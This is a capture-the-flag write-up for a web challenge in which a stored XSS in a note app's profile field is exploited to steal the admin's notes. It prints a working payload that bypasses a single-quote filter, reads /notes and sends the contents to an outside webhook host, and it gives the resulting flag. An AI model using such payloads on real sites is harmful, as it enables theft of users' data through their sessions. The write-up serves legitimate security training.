# noteapp

## problem

```
I made this notekeeper to keep your notes safe. Its not an heap chall 😉

The flag is in the admin's notes.
```

## solution

sourceless web, despite what the rules for making challs say...

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/3166c548-c8a8-456b-9c24-87eb60ac3792)

also, i dont know what a heap chall is.

this was made by 0xM4hm0ud, and i know that 0xM4hm0ud loves pwn more than anything else, so i was scared to see a 150pt chall from him.

anyways, it was a pretty simple XSS chall.

we are presented with a login screen at first

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/7609ff9a-2ccd-4f17-8132-e8605c50ea7d)

we can register too

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/16f2ced0-77f6-42af-95f7-b3ced5b5f786)

here, i will register as qww a bunch

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/a8e8eedd-7b66-494c-a7e8-4ee8783d3fa2)

we can see that there are a few things we can do here

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/c1cfab22-b316-48fc-b3da-0695fcffe460)

we know the flag is in the admins notes, but we dont know the admin password

we can use `/report` to report a site to the admin bot

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/4d013ee5-ef2e-4ebc-a1d9-1ed211cf3334)

we also know that the token is stored as the `connect.sid` cookie like so: ![image](https://github.com/quasar098/ctf-writeups/assets/70716985/19a4f741-a89d-4b54-aec4-7baed6dcf971)

one of the controls that we have in this website is to change our user profile

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/29a4a1ff-a5a8-451f-be82-c27b41fd76ac)

here, we can do an XSS.

the intended solution here was to overflow a wasm buffer to bypass quote filtering and get an XSS, but i dont know how to do that. so, i used two quotes instead of one to bypass the quote filter

this is the source of the filtering, hidden from us:

```js
        const username = req.body.username.replace("\"", "");
        const email = req.body.email.replace("\"", "");
```

the vulnerability here, which we couldn't see, was that javascript's replace function only replaces the first occurence of a string

so, a script like

```js
let thing = `
fetch('/notes').then((r) => {r.text().then((w) => {fetch('https://webhook.site/96d5c0f0-d4be-488e-<rest-of-webhook>?d=' + btoa(w))})})
</script>`;
fetch("http://167.99.0.85/updateprofile", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9,ar;q=0.8",
    "cache-control": "no-cache",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "pragma": "no-cache",
    "x-requested-with": "XMLHttpRequest"
  },
  "referrer": "http://167.99.0.85/profile/<profileid>",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": `username=%22%22%3E%3Cscript%3E${encodeURIComponent(thing)}&email=`,
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```

will work. note that the username length restriction is client-side only, so we can spoof a request and bypass the restriction

the payload is as follows: `""><script>${encodeURIComponent(thing)}fetch('/notes').then((r) => {r.text().then((w) => {fetch('https://<malicious-site-url>/?d=' + btoa(w))})})</script>`

we put two quotes to bypass the replace, and then escape out of the span tag. then, we enter a new script and place in the rest of our payload

note that the `connect.sid` is httpOnly true, so we can't access it from code. however, we can execute code as the admin, 
which allows us to fetch the admins notes and then send them back to us, without having to log in as the admin

anyways, the flag is `ictf{w4sm_0v3rfl0w_t0_xSs_c67e2ec016f0bc0e495655ee70fe2a2d}`

i didn't even see that there was a wasm file...
